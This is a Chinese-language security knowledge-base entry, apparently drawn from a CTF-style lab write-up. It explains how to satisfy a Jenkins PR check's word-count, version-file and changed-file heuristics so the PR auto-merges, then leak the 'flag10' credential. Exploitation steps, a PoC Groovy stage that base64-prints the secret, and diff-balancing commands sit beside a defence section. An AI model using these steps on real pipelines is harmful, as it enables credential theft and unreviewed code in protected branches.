---
id: cloud-cicd-jenkins-pr-check-bypass-auto-merge-credential-theft
title: 构造变更通过 Jenkins PR 校验（词数平衡/版本文件）触发自动合并后窃取凭据
type: scenario
domain: cloud
path: cloud/ci-cd
technique: jenkins-pr-check-bypass-auto-merge
aliases:
- PR 校验绕过
- 自动合并绕过
- word-diff 平衡
- version 文件校验
- Jenkins 自动 merge
- Mock Turtle
tags:
- cicd
- jenkins
- pr-check
- auto-merge
- validation-bypass
- credentials
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V658
  verified_at: '2026-11-13T06:42:21+08:00'
  notes: 已对照原文与图15/16核对词数平衡/version 单行 x.y.z/改动 version 三项检查、check1-3=true、pulls/2/merge 与 flag10 base64 输出。
---

## 一句话结论

当 Jenkins 用脆弱启发式校验 PR——要求新增与删除单词数相等、`version` 文件只有一行且符合 `x.y.z`、且 PR 必须修改 `version`——满足条件就自动调用 Gitea API 合并时，攻击者可以修改 Jenkinsfile 加入窃取凭据的 stage，写一行合法版本号并用填充单词配平 diff 词数，使三项检查全部通过、PR 自动合并，合并后的构建随即用 `withCredentials` 泄露 flag10。

## 原理

- **门禁是文本启发式而非审查**：`git diff --word-diff=porcelain origin/main | grep '^+[^+]' | wc -w` 与 `^-[^-]` 的计数相等、`grep -P '^\d{1,2}\.\d{1,2}\.\d{1,2}$' version` 且 `wc -l` 为 1、`git diff --name-only` 含 `version`，这些条件都能被攻击者主动构造满足。
- **自动合并即信任提升**：校验通过后 Jenkins 直接 `curl -X POST .../pulls/<id>/merge` 合并 PR；攻击者的变更（含恶意 Jenkinsfile）进入 main，随后 main 构建使用更高权限凭据。
- **危害**：绕过的是"自动合并前的质量/发布门禁"，最终仍以凭据泄露收尾；在真实环境中可借此把后门/不安全变更合入受保护分支。

## 触发条件

- Jenkins PR 检查逻辑使用上述可满足的启发式，并在通过后自动合并。
- 攻击者可提交 PR 并控制变更内容（Jenkinsfile、版本文件、填充文本）。
- 合并后 main 分支会自动构建且构建使用敏感凭据。

## 利用步骤

1. clone 仓库，修改 Jenkinsfile 增加读取 flag10 的 stage：
   ```groovy
   stage('pr_checks') {
       steps {
           withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'flag10', passwordVariable: 'TOKEN')]) {
               sh 'echo $TOKEN | base64'
           }
       }
   }
   ```
2. 写入单行无换行版本号：`echo "1.0.13\c" > version`。
3. 添加填充文件/文本，使 `git diff --word-diff=porcelain origin/main` 的 `+` 词数与 `-` 词数相等（原文用大量 `a` 单词配平，如 1514 对 154，按实际 diff 调整）。
4. push 并提 PR；Jenkins 日志显示 `check1/2/3=true` 并 `POST .../pulls/2/merge`。
5. PR 自动合并后触发 main 构建，从日志取 flag10 base64。

## PoC

```bash
echo "1.0.13\c" > version
# 用填充文本配平新增/删除词数（数量按实际 diff 调整）
git diff --word-diff=porcelain origin/main | grep -e "^+[^+]" | wc -w
git diff --word-diff=porcelain origin/main | grep -e "^-[^-]" | wc -w
```

```groovy
stage('pr_checks') {
    steps {
        withCredentials([usernamePassword(credentialsId: 'flag10', usernameVariable: 'flag10', passwordVariable: 'TOKEN')]) {
            sh 'echo $TOKEN | base64'
        }
    }
}
```

原文在 Jenkins 日志中确认三项检查通过并自动 merge 成功。

## 变体与关联

- **机器人变体**：Dependabot/Mergify/自定义自动合并机器人的规则（只查文件、标签、CI 状态）也可能被类似方式满足。
- **检查逻辑缺陷**：只校验文件存在/格式/行数、只看退出码、word-diff 统计不严谨。
- **关联**：[[cloud-cicd-jenkins-direct-ppe-jenkinsfile-credential-exfil]]（合并后的凭据窃取）。

## 检测与防御

- **自动合并需人工审批**：受保护分支 + CODEOWNERS + 至少一名 reviewer；自动合并仅用于低风险依赖更新。
- **不要用文本启发式做安全门禁**：把版本/变更校验换成结构化检查（语义化版本解析、AST/策略引擎），并校验变更涉及的文件类型。
- **对高权限文件强制审查**：Jenkinsfile、CI 配置、部署脚本的任何变更必须人工审批。
- **监控**：记录自动 merge API 调用与触发条件；对"配平大量无意义文本"的 PR 告警；合并后构建使用受限凭据。
